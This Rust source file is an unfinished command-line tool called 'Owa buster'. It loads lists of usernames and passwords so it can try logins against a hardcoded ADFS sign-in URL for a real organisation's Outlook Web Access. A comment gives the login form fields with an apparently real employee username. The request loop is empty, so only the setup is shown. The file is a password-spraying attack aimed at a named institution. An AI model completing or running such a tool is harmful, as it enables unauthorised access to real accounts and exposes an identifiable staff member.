use std::fs;
use std::io::BufReader;
use std::io::prelude::*;
use std::time::{Duration, SystemTime};
use clap::{App, AppSettings, Arg};
use futures::{stream, StreamExt};
use reqwest::Client;

struct User{
    username: String,
    time_stamp:  SystemTime,
    index_of_last_pass: i64,
}
impl User {
    fn set_time_stamp(&mut self, new_time:SystemTime){
        self.time_stamp = new_time;
    }
    fn set_index (&mut self, new_index: i64){
        self.index_of_last_pass = new_index;
    }
}

pub fn initialize () -> App<'static, 'static>{
    let mut cli_args = App::new("Owa buster")
    .version("0.01")
    .author("xD")
    .arg(Arg::with_name("users")
        .short("u")
        .required(true)
        .long("users")
        .value_name("FILE")
        .help("Set full path to file with user name in format user@domain.com")
        .takes_value(true))
    .arg(Arg::with_name("passwords")
        .short("p")    
        .required(true)
        .long("passwords")
        .value_name("FILE")
        .help("Set full path to file with passwords")
        .takes_value(true));

    cli_args
}

const URL: &str = "https://adfssp.socpoist.sk/adfs/ls?version=1.0&action=signin&realm=urn%3AAppProxy%3Acom&appRealm=99a97e1d-2ce9-e611-90f8-001dd8b71e41&returnUrl=https%3A%2F%2Fposta.socpoist.sk%2Fowa%2F&client-request-id=3823A81D-0B03-0000-EB0A-2438030BD801#path=/mail";

//UserName=ba-blasko_f%40socpoist.sk&Password=test_password&AuthMethod=FormsAuthentication
fn get_files () -> (Vec<User>, Vec<String>) {
    let cli_args = initialize().get_matches();
    let users_path = cli_args.value_of("users").unwrap();
    let passwords_path = cli_args.value_of("passwords").unwrap();

    let user_file = match fs::File::open(users_path){
        Err(why) => panic!("couldn't open {}", std::error::Error::to_string(&why)),
        Ok(file) => file,
    };
    let password_file = match fs::File::open(passwords_path){
        Err(why) => panic!("couldn't open {} ", std::error::Error::to_string(&why)),
        Ok(file) => file,
    };

    let users : Vec<_> = BufReader::new(user_file).lines().map(|l| l.expect("empty file")).map(|l| User{username:l, time_stamp: SystemTime::now(), index_of_last_pass: 0,}).collect();
    let passwords : Vec<_> = BufReader::new(password_file).lines().map(|l| l.expect("empty file")).collect();
    (users, passwords)
}

fn requester (client: &Client, mut users: Vec<User>, passwords: Vec<String>){
    
}

#[tokio::main]
async fn main() {
    let (users, passwords) = get_files();

    let client = Client::new();

    requester(&client, users, passwords);


}
        